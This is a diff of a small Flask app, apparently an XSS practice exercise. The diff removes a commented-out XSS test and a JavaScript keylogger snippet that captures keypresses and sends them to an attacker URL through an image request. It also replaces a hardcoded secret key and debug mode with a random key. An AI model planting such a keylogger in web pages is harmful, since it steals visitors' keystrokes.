@@ -1,26 +1,7 @@
 from flask import Flask, render_template, request, redirect, jsonify, \
     url_for, flash
 
-
-#<h1 onclick="alert()">hello</h1>
-'''
-document.onkeypress = function(e) {
-    var timestamp = Date.now() | 0;
-    var stroke = {
-        k: e.key,
-        t: timestamp
-    };
-    console.log(stroke);
-}
-window.setInterval(function() {
-    if (buffer.length > 0) {
-        var data = JSON.stringify(buffer);
-        new Image().src = attacker + data;
-        buffer = [];
-    }
-}, 200);
-
-'''
+import os
 
 app = Flask(__name__)
 
@@ -53,6 +34,5 @@ def level2():
     return render_template('level2.html',list=comments)
 
 if __name__ == '__main__':
-    app.secret_key = 'super_secret_key'
-    app.debug = True
+    app.secret_key = os.urandom(24)
     app.run()
